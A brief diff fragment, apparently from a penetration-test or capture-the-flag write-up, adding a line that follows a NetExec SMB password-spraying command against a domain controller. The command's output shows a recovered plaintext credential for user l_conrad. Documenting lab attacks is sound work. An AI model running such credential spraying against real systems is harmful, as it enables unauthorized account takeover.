@@ -894,5 +894,7 @@ nxc smb dc01.ctos.corp -u users.txt -p passwords.txt --continue-on-success
 ...[SNIP]...
 
 SMB         10.1.24.233     445    DC01             [+] CTOS.CORP\l_conrad:LIS!2026$ad 
-
 ```
+
+I have compromised a user `l_conrad`
+
